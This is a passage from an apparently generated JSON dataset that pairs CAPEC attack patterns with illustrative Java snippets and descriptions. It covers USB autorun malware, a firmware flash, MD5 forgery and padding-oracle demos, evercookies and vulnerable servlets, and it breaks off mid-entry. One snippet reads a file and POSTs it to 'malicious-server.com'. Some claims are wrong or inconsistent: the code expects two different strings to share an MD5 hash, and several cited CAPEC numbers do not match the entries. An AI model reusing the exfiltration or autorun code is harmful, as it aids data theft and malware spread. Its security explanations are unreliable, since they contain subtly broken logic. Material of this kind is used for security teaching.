        "code_snippet": "import java.io.*;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) {\n        String usbPath = \"E:\\\\autorun.inf\";\n        try {\n            // Check if the USB drive is connected\n            File usbDrive = new File(usbPath);\n            if (usbDrive.exists()) {\n                // Create a malicious DLL file on the USB drive\n                File maliciousDll = new File(\"E:\\\\malicious.dll\");\n                try (FileWriter writer = new FileWriter(maliciousDll)) {\n                    writer.write(\"// Malicious code here\");\n                }\n\n                // Create an autorun.inf file to execute the malicious DLL\n                try (FileWriter writer = new FileWriter(usbDrive)) {\n                    writer.write(\"[autorun]\\n\");\n                    writer.write(\"open=malicious.dll\\n\");\n                    writer.write(\"action=Run malicious code\\n\");\n                }\n\n                System.out.println(\"Malicious files created on USB drive.\");\n            } else {\n                System.out.println(\"USB drive not found.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of malware propagation via a USB drive using the autorun feature. The code checks if a USB drive is connected and then creates a malicious DLL file and an autorun.inf file on the USB drive. The autorun.inf file is configured to execute the malicious DLL when the USB drive is accessed. This embodies the main idea of the deprecated CAPEC-448, which involves embedding a virus into a DLL and using autorun to propagate malware. The code also touches on related CWEs such as Trojan Horse (CWE-507) and Embedded Malicious Code (CWE-506) by hiding malicious functionality within seemingly benign files."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class MalwarePropagation {\n    public static void main(String[] args) {\n        String sourcePath = \"/path/to/infected/usb/device/malware.exe\";\n        String destinationPath = \"/path/to/target/system/malware.exe\";\n\n        try {\n            // Simulate copying malware from infected USB to target system\n            copyFile(sourcePath, destinationPath);\n\n            // Simulate execution of the copied malware\n            Runtime.getRuntime().exec(destinationPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void copyFile(String source, String destination) throws IOException {\n        Files.copy(Paths.get(source), new FileOutputStream(destination));\n    }\n}",
        "description": "This Java code snippet demonstrates the propagation of malware via an infected peripheral device, such as a USB drive. The code copies a malicious executable file from a specified source path (representing the infected USB device) to a destination path on the target system. After copying, it executes the malware. This embodies the main idea of the deprecated CAPEC pattern 'Malware Propagation via Infected Peripheral Device'. The code also touches on CWE-507 (Trojan Horse) as the malware appears to be a benign file but contains harmful code. Additionally, it indirectly relates to CWE-589 (Call to Non-ubiquitous API) as the `Runtime.getRuntime().exec()` method may not behave consistently across different platforms, potentially leading to security issues."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "public class InfectedHardware {\n    private static boolean debugMode = false;\n    private static int[] registers = new int[10];\n\n    public static void main(String[] args) {\n        // Simulate normal operation\n        normalOperation();\n\n        // Malicious logic hidden from the user\n        if (debugMode) {\n            activateMaliciousLogic();\n        }\n    }\n\n    private static void normalOperation() {\n        // Normal hardware operations\n        System.out.println(\"Hardware operating normally.\");\n    }\n\n    private static void activateMaliciousLogic() {\n        // Malicious code that alters hardware behavior\n        for (int i = 0; i < registers.length; i++) {\n            registers[i] = 0xDEADBEEF; // Overwrite registers with malicious data\n        }\n        System.out.println(\"Malicious logic activated. Registers compromised.\");\n    }\n\n    // Simulate improper access control to register interface\n    public static void writeRegister(int index, int value) {\n        if (index >= 0 && index < registers.length) {\n            registers[index] = value;\n        } else {\n            System.out.println(\"Invalid register index.\");\n        }\n    }\n\n    // Simulate activation of debug mode at runtime\n    public static void enableDebugMode() {\n        debugMode = true;\n    }\n}",
        "description": "This Java code snippet simulates a scenario where malicious logic is inserted into hardware. The `main` method represents the normal operation of the hardware, while the `activateMaliciousLogic` method embodies the hidden malicious logic that can be activated during runtime. The `writeRegister` method demonstrates improper access control to memory-mapped I/O registers, allowing unauthorized modifications. The `enableDebugMode` method simulates the activation of debug logic at runtime, which can be exploited to alter the hardware's behavior. This code represents the CAPEC of 'Infected Hardware' and incorporates related CWEs such as embedded malicious code, improper access control, and activation of debug logic at runtime."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "public class MaliciousHardware {\n    private static final String MALICIOUS_PAYLOAD = \"malicious_code\";\n\n    public static void main(String[] args) {\n        // Simulate hardware initialization\n        initializeHardware();\n\n        // Inject malicious logic\n        injectMaliciousLogic();\n    }\n\n    private static void initializeHardware() {\n        System.out.println(\"Hardware initialized.\");\n    }\n\n    private static void injectMaliciousLogic() {\n        // Simulate unauthorized error injection\n        if (isUnauthorizedAgent()) {\n            System.out.println(\"Injecting malicious logic: \" + MALICIOUS_PAYLOAD);\n            // Simulate degradation of hardware redundancy\n            degradeHardwareRedundancy();\n        }\n    }\n\n    private static boolean isUnauthorizedAgent() {\n        // Simulate a check for unauthorized agent\n        return true; // In a real scenario, this would be a security flaw\n    }\n\n    private static void degradeHardwareRedundancy() {\n        System.out.println(\"Hardware redundancy degraded.\");\n    }\n}",
        "description": "This Java code snippet simulates the insertion of malicious logic into hardware, embodying the main idea of the deprecated CAPEC-452. The code initializes hardware and then injects malicious logic if an unauthorized agent is detected. This is represented by the `isUnauthorizedAgent` method, which always returns true, simulating a security flaw. The `injectMaliciousLogic` method then prints a message indicating the injection of malicious code and calls `degradeHardwareRedundancy` to simulate the degradation of hardware redundancy. This snippet incorporates CWE-506 (Embedded Malicious Code) and CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy) to illustrate the potential vulnerabilities in hardware systems."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "public class HardwareComponent {\n    private boolean isMalicious = false;\n    private String firmwareVersion = \"1.0.0\";\n\n    public void updateFirmware(String newFirmware) {\n        if (newFirmware.contains(\"malicious\")) {\n            isMalicious = true;\n        }\n        firmwareVersion = newFirmware;\n    }\n\n    public void performOperation() {\n        if (isMalicious) {\n            System.out.println(\"Performing malicious operation...\");\n            // Malicious code execution\n        } else {\n            System.out.println(\"Performing normal operation...\");\n            // Normal operation code\n        }\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent component = new HardwareComponent();\n        component.updateFirmware(\"malicious_firmware_v2.0.0\");\n        component.performOperation();\n    }\n}",
        "description": "This Java code snippet represents a hardware component that can be updated with new firmware. The `updateFirmware` method checks if the new firmware contains the string 'malicious', and if so, sets a flag indicating that the component is now malicious. The `performOperation` method then performs different actions based on whether the component is flagged as malicious. This embodies the idea of CAPEC-452, where malicious logic is inserted into product hardware. The code also touches on CWE-506 (Embedded Malicious Code) by demonstrating how malicious code can be embedded and executed, and CWE-1329 (Reliance on Component That is Not Updateable) by showing the potential risks of updating firmware with malicious content."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "public class HardwareComponent {\n    private boolean isMalicious;\n    private String data;\n\n    public HardwareComponent(boolean isMalicious) {\n        this.isMalicious = isMalicious;\n        this.data = \"\";\n    }\n\n    public void storeData(String inputData) {\n        if (isMalicious) {\n            // Malicious logic: modify stored data\n            this.data = \"malicious_data\";\n        } else {\n            this.data = inputData;\n        }\n    }\n\n    public String retrieveData() {\n        return this.data;\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent component = new HardwareComponent(true); // Malicious component\n        component.storeData(\"sensitive_data\");\n        System.out.println(\"Stored Data: \" + component.retrieveData()); // Outputs: malicious_data\n    }\n}",
        "description": "This Java code snippet represents a hardware component that can be either benign or malicious. The `HardwareComponent` class has a boolean flag `isMalicious` to indicate if the component is malicious. When storing data using the `storeData` method, if the component is malicious, it modifies the data to 'malicious_data' instead of storing the actual input. This embodies the idea of malicious logic insertion into hardware, as described in CAPEC-457. The code also touches on CWE-506 (Embedded Malicious Code) by demonstrating how a malicious component can alter data, and CWE-1334 (Unauthorized Error Injection) by showing how unauthorized modification can degrade the system's integrity."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "public class InfectedMemoryExample {\n    private static final int PROTECTED_MEMORY_START = 0x1000;\n    private static final int PROTECTED_MEMORY_END = 0x1FFF;\n    private static final int MIRRORED_MEMORY_START = 0x2000;\n    private static final int MIRRORED_MEMORY_END = 0x2FFF;\n\n    private static byte[] memory = new byte[0x3000];\n\n    public static void main(String[] args) {\n        // Simulate secure boot process\n        secureBoot();\n\n        // Malicious code injection into mirrored memory\n        injectMaliciousCode(MIRRORED_MEMORY_START);\n\n        // Accessing protected memory through mirrored region\n        byte data = readMemory(MIRRORED_MEMORY_START);\n        System.out.println(\"Data from mirrored memory: \" + data);\n    }\n\n    private static void secureBoot() {\n        // Load bootloader code into protected memory\n        for (int i = PROTECTED_MEMORY_START; i <= PROTECTED_MEMORY_END; i++) {\n            memory[i] = (byte) (i & 0xFF); // Dummy bootloader code\n        }\n    }\n\n    private static void injectMaliciousCode(int address) {\n        if (address >= MIRRORED_MEMORY_START && address <= MIRRORED_MEMORY_END) {\n            memory[address] = (byte) 0xDE; // Malicious code\n        }\n    }\n\n    private static byte readMemory(int address) {\n        if (address >= PROTECTED_MEMORY_START && address <= PROTECTED_MEMORY_END) {\n            throw new SecurityException(\"Access to protected memory is denied!\");\n        }\n        return memory[address];\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can inject malicious code into a mirrored memory region, bypassing the intended access control mechanisms. The `secureBoot` method simulates the secure boot process by loading bootloader code into a protected memory region. The `injectMaliciousCode` method shows how an attacker can insert malicious code into a mirrored memory region, which is not adequately protected. The `readMemory` method attempts to enforce access control but fails to account for the mirrored memory region, allowing the attacker to read from it. This example embodies the main idea of the CAPEC 'Infected Memory' and highlights related CWEs such as improper access control for mirrored memory regions and overlapping protected and unprotected memory ranges."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class USBMalware {\n    public static void main(String[] args) {\n        try {\n            // Simulate reading sensitive data from a file on the USB stick\n            File file = new File(\"/media/usb/sensitive_data.txt\");\n            FileInputStream fis = new FileInputStream(file);\n            Scanner scanner = new Scanner(fis);\n            StringBuilder data = new StringBuilder();\n            while (scanner.hasNextLine()) {\n                data.append(scanner.nextLine()).append(\"\\n\");\n            }\n            scanner.close();\n            fis.close();\n\n            // Transmit the sensitive data in cleartext to a remote server\n            URL url = new URL(\"http://malicious-server.com/upload\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            conn.getOutputStream().write(data.toString().getBytes());\n            conn.getOutputStream().flush();\n            conn.getOutputStream().close();\n\n            // Simulate network sniffing (not implemented for brevity)\n            // Simulate keystroke logging (not implemented for brevity)\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates a USB malware attack. It reads sensitive data from a file on a USB stick and transmits it in cleartext to a remote server. This embodies the main idea of CAPEC-160 (USB Memory Attacks) and demonstrates CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-506 (Embedded Malicious Code). The code also hints at additional malicious activities such as network sniffing and keystroke logging, which are not implemented for brevity."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FlashMemoryAttack {\n    private static final String BIOS_PATH = \"/dev/bios\";\n    private static final byte[] MALICIOUS_CODE = {0x00, 0x01, 0x02, 0x03}; // Simplified malicious payload\n\n    public static void main(String[] args) {\n        try {\n            flashMaliciousCode();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void flashMaliciousCode() throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(BIOS_PATH)) {\n            fos.write(MALICIOUS_CODE);\n            System.out.println(\"Malicious code flashed to BIOS.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a flash memory attack, where malicious code is written to the BIOS of a device. The `flashMaliciousCode` method opens a file output stream to the BIOS path and writes a byte array representing the malicious payload. This example embodies the main idea of CAPEC-1282 (Flash Memory Attacks) by showing how an adversary might insert malicious logic into a device's firmware. The code also touches on CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory) by writing to what should be immutable BIOS memory, and CWE-506 (Embedded Malicious Code) by embedding a malicious payload."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.cert.CertificateException;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.X509Certificate;\nimport java.util.Base64;\n\npublic class RogueCACertificate {\n    public static void main(String[] args) throws CertificateException, NoSuchAlgorithmException {\n        // Simulate a weak hashing algorithm (e.g., MD5)\n        String weakHashAlgorithm = \"MD5\";\n        MessageDigest md = MessageDigest.getInstance(weakHashAlgorithm);\n\n        // Original certificate data (CSR1)\n        String csr1 = \"Original Certificate Signing Request\";\n        byte[] csr1Hash = md.digest(csr1.getBytes());\n\n        // Malicious certificate data (CSR2) with the same hash\n        String csr2 = \"Malicious Certificate Signing Request\";\n        byte[] csr2Hash = md.digest(csr2.getBytes());\n\n        // Check if hashes collide (they should in this example)\n        if (MessageDigest.isEqual(csr1Hash, csr2Hash)) {\n            System.out.println(\"Hash collision detected!\");\n\n            // Simulate signing CSR1 by a trusted CA\n            String signedCsr1 = Base64.getEncoder().encodeToString(csr1Hash);\n\n            // Use the signed blob to create a rogue certificate (CSR2)\n            String rogueCertificate = \"-----BEGIN CERTIFICATE-----\\n\" + signedCsr1 + \"\\n-----END CERTIFICATE-----\";\n\n            // Validate the rogue certificate (improper validation)\n            CertificateFactory cf = CertificateFactory.getInstance(\"X.509\");\n            X509Certificate cert = (X509Certificate) cf.generateCertificate(\n                    new java.io.ByteArrayInputStream(rogueCertificate.getBytes()));\n\n            // Print the rogue certificate\n            System.out.println(\"Rogue Certificate: \" + cert.toString());\n        } else {\n            System.out.println(\"No hash collision detected.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5 in this case). The code simulates the generation of two different certificate signing requests (CSR1 and CSR2) that result in the same hash value due to the weak collision resistance of the MD5 algorithm. It then shows how an attacker can use the signed hash of CSR1 to create a rogue certificate (CSR2) that appears to be signed by a trusted certificate authority. The code also includes improper validation of the rogue certificate, highlighting the potential security risks associated with using broken or risky cryptographic algorithms and improper certificate validation."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String action = request.getParameter(\"action\");\n\n        // Potentially vulnerable code: concatenating parameters directly into a command\n        String command = \"processUser --id=\" + userId + \" --action=\" + action;\n\n        // Simulate command execution (in reality, this could be a system call or another sensitive operation)\n        System.out.println(\"Executing command: \" + command);\n\n        response.getWriter().write(\"Command executed: \" + command);\n    }\n}",
        "description": "This Java servlet code demonstrates a potential vulnerability to HTTP Parameter Pollution (HPP). The servlet processes HTTP GET requests and retrieves parameters 'userId' and 'action' from the query string. These parameters are then directly concatenated into a command string without proper validation or neutralization. This can lead to several issues as described in the related CWEs:\n\n1. **CWE-88 (Argument Injection)**: The command string is constructed by directly concatenating user input, which can lead to argument injection if an attacker manipulates the input.\n2. **CWE-147 (Improper Neutralization of Input Terminators)**: Special characters in the input are not neutralized, which could be interpreted as input terminators by downstream components.\n3. **CWE-235 (Improper Handling of Extra Parameters)**: The servlet does not handle cases where multiple parameters with the same name are provided, potentially leading to unexpected behavior.\n4. **CWE-598 (Use of GET Request Method With Sensitive Query Strings)**: Sensitive information is included in the query string of a GET request, which can be logged or cached, leading to information leakage.\n5. **CWE-84 (Improper Neutralization of Encoded URI Schemes in a Web Page)**: Although not directly shown in this snippet, improper handling of encoded URI schemes could lead to script injection if the input is not properly sanitized.\n\nOverall, this code snippet highlights the risks associated with HTTP Parameter Pollution and the importance of proper input validation and neutralization to prevent security vulnerabilities."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class WebServiceAPI {\n    private static final String SECRET_TOKEN = \"secret\";\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String userInput = \"userInput\";\n        String forgedInput = userInput + \"&extraParam=malicious\";\n\n        String originalHash = generateHash(userInput + SECRET_TOKEN);\n        String forgedHash = generateHash(forgedInput + SECRET_TOKEN);\n\n        System.out.println(\"Original Hash: \" + originalHash);\n        System.out.println(\"Forged Hash: \" + forgedHash);\n\n        if (originalHash.equals(forgedHash)) {\n            System.out.println(\"Authentication Bypassed!\");\n        } else {\n            System.out.println(\"Authentication Failed.\");\n        }\n    }\n\n    private static String generateHash(String input) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-328: Use of Weak Hash\n        byte[] hashBytes = md.digest(input.getBytes());\n        return Base64.getEncoder().encodeToString(hashBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an adversary can exploit a hash function extension weakness to forge a valid signature hash. The `generateHash` method uses the weak MD5 hash function (CWE-328), which is susceptible to various attacks. The code simulates an authentication process where a user input is hashed along with a secret token. An attacker can modify the input by appending malicious parameters and generate a new hash. If the original and forged hashes match, the authentication is bypassed (CWE-290, CWE-305). This example highlights the risks of using weak hash functions and improper authentication mechanisms."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CrossDomainTimingAttack {\n    public static void main(String[] args) throws IOException {\n        String targetUrl = \"http://example.com/sensitiveEndpoint\";\n        long startTime = System.currentTimeMillis();\n        sendGetRequest(targetUrl);\n        long endTime = System.currentTimeMillis();\n        System.out.println(\"Response time: \" + (endTime - startTime) + \"ms\");\n    }\n\n    private static void sendGetRequest(String targetUrl) throws IOException {\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n        int responseCode = connection.getResponseCode();\n        System.out.println(\"Response Code: \" + responseCode);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic cross-domain timing attack. The attacker sends an HTTP GET request to a target URL and measures the time taken for the server to respond. The response time can reveal information about the server's state or the presence of certain data, even though the attacker cannot directly read the response due to the same-origin policy. This embodies the CAPEC concept of 'Cross-Domain Search Timing' and relates to CWE-385 (Covert Timing Channel) and CWE-208 (Observable Timing Discrepancy). The code also sets a user-agent header to mimic a legitimate browser request, which can be related to CWE-352 (CSRF) and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.IvParameterSpec;\nimport java.util.Base64;\n\npublic class PaddingOracleExample {\n    private static final String KEY = \"0123456789abcdef\"; // 16-byte key\n    private static final String IV = \"abcdef9876543210\"; // 16-byte IV\n\n    public static void main(String[] args) {\n        try {\n            String ciphertext = \"...\"; // Some base64 encoded ciphertext\n            byte[] decodedCiphertext = Base64.getDecoder().decode(ciphertext);\n            decrypt(decodedCiphertext);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void decrypt(byte[] ciphertext) {\n        try {\n            Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n            SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), \"AES\");\n            IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes());\n            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);\n            byte[] plaintext = cipher.doFinal(ciphertext);\n            System.out.println(\"Decryption successful: \" + new String(plaintext));\n        } catch (Exception e) {\n            if (e.getMessage().contains(\"pad block corrupted\")) {\n                System.out.println(\"Padding error detected\");\n            } else {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable decryption process that can be exploited in a Padding Oracle Crypto Attack. The code uses AES encryption in CBC mode with PKCS5 padding. When a decryption error occurs, it checks if the error message contains 'pad block corrupted' and prints 'Padding error detected'. This leakage of padding error information can be exploited by an attacker to decrypt the ciphertext without knowing the key. The code embodies CWE-209 (Generation of Error Message Containing Sensitive Information) by revealing specific error messages, and CWE-649 (Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking) by not performing integrity checks on the ciphertext."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import java.io.*;\nimport javax.servlet.http.*;\n\npublic class EvercookieExample extends HttpServlet {\n    private static final String COOKIE_NAME = \"evercookie\";\n    private static final String COOKIE_VALUE = \"sensitiveData\";\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Create a persistent cookie\n        Cookie cookie = new Cookie(COOKIE_NAME, COOKIE_VALUE);\n        cookie.setMaxAge(60 * 60 * 24 * 365); // 1 year\n        response.addCookie(cookie);\n\n        // Store the cookie in multiple locations\n        storeInLocalStorage(response);\n        storeInSessionStorage(response);\n        storeInFlash(response);\n\n        response.getWriter().println(\"Evercookie set.\");\n    }\n\n    private void storeInLocalStorage(HttpServletResponse response) throws IOException {\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"localStorage.setItem('\" + COOKIE_NAME + \"', '\" + COOKIE_VALUE + \"');\");\n        response.getWriter().println(\"</script>\");\n    }\n\n    private void storeInSessionStorage(HttpServletResponse response) throws IOException {\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"sessionStorage.setItem('\" + COOKIE_NAME + \"', '\" + COOKIE_VALUE + \"');\");\n        response.getWriter().println(\"</script>\");\n    }\n\n    private void storeInFlash(HttpServletResponse response) throws IOException {\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"// Assuming Flash storage is accessible via JavaScript\");\n        response.getWriter().println(\"// This is a placeholder for actual Flash storage code\");\n        response.getWriter().println(\"</script>\");\n    }\n}",
        "description": "This Java servlet code demonstrates the concept of an 'evercookie', which is a highly persistent cookie that is stored in multiple locations on the user's machine. The code sets a cookie with sensitive information and stores it in various places such as localStorage, sessionStorage, and a placeholder for Flash storage. This ensures that even if the user deletes the cookie from one location, it can be resurrected from another. The code embodies the CAPEC idea of creating a persistent cookie that is difficult to remove, and it highlights related CWEs such as the use of persistent cookies containing sensitive information (CWE-539), reliance on cookies without validation and integrity checking (CWE-784, CWE-565), and cleartext storage of sensitive information in a cookie (CWE-315)."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TransparentProxy {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ProxyHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ProxyHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ProxyHandler(Socket clientSocket) {\n        this.clientSocket = clientSocket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream clientInput = clientSocket.getInputStream();\n            OutputStream clientOutput = clientSocket.getOutputStream();\n\n            // Read the client's request\n            BufferedReader reader = new BufferedReader(new InputStreamReader(clientInput));\n            String requestLine = reader.readLine();\n\n            // Forward the request to the intended server\n            Socket serverSocket = new Socket(\"example.com\", 80);\n            OutputStream serverOutput = serverSocket.getOutputStream();\n            serverOutput.write((requestLine + \"\\r\\n\").getBytes());\n\n            // Read the server's response\n            InputStream serverInput = serverSocket.getInputStream();\n            BufferedReader serverReader = new BufferedReader(new InputStreamReader(serverInput));\n            String responseLine;\n            while ((responseLine = serverReader.readLine()) != null) {\n                // Forward the response back to the client\n                clientOutput.write((responseLine + \"\\r\\n\").getBytes());\n            }\n\n            // Close connections\n            serverSocket.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple transparent proxy server. The proxy listens for incoming client connections on port 8080. When a client connects, the proxy reads the client's request and forwards it to an external server (example.com in this case). The proxy then reads the server's response and forwards it back to the client. This process is done transparently, meaning the client is unaware of the proxy's presence.\n\nThe code embodies the main idea of the CAPEC 'Transparent Proxy Abuse' by acting as an intermediary between the client and the server. It also touches on several related CWEs:\n\n1. CWE-441: The proxy does not preserve the original source of the request, making it appear as the source of the request (Confused Deputy).\n2. CWE-444: The proxy does not handle malformed HTTP requests or responses, which could lead to HTTP Request/Response Smuggling.\n3. CWE-602: The proxy relies on the client to send a valid request, which could be manipulated (Client-Side Enforcement of Server-Side Security).\n4. CWE-212: The proxy does not remove sensitive information from the request or response, potentially exposing it to unauthorized actors (Improper Removal of Sensitive Information).\n5. CWE-941: The proxy could incorrectly specify the destination server, leading to communication with unintended actors (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class InsecureCommunication {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\"); // Non-TLS URL\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            connection.setRequestProperty(\"Authorization\", \"Bearer some-token\");\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuilder response = new StringBuilder();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // Output the response\n                System.out.println(response.toString());\n            } else {\n                System.out.println(\"GET request failed\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an insecure communication channel that can be exploited by an attacker to bypass the same origin policy. The code makes an HTTP GET request to a non-TLS URL (http://example.com/api/data), which is vulnerable to Man-in-the-Middle (MitM) attacks (CAPEC-94). The connection does not verify the identity of the endpoint (CWE-923), and sensitive information (an authorization token) is sent over an insecure channel. This setup allows an attacker on the same network, such as a public Wi-Fi hotspot, to intercept and potentially manipulate the communication, thereby bypassing the same origin policy protection in the victim's browser."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\n@WebServlet(\"/fetchUserInfo\")\npublic class FetchUserInfoServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String socialNetworkApiUrl = \"https://socialnetwork.com/api/userinfo?session=\" + request.getParameter(\"session\");\n        URL url = new URL(socialNetworkApiUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        InputStream inputStream = connection.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        StringBuilder userInfo = new StringBuilder();\n        while ((bytesRead = inputStream.read(buffer)) != -1) {\n            userInfo.append(new String(buffer, 0, bytesRead));\n        }\n        inputStream.close();\n        response.getWriter().write(userInfo.toString());\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross Site Identification attack. The servlet fetches user information from a social networking site using an active session identifier provided as a query parameter. The code constructs a URL with the session identifier and sends a GET request to the social network's API to retrieve user information. This information is then written to the response. The code is vulnerable to several issues: \n1. CWE-352 (CSRF): The servlet does not verify if the request is intentionally made by the user.\n2. CWE-359 (Exposure of Private Personal Information): The servlet exposes private user information to unauthorized actors.\n3. CWE-598 (Use of GET Request Method With Sensitive Query Strings): The session identifier is included in the URL query string.\n4. CWE-79 (Cross-site Scripting): The user information is directly written to the response without proper sanitization, making it vulnerable to XSS attacks."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
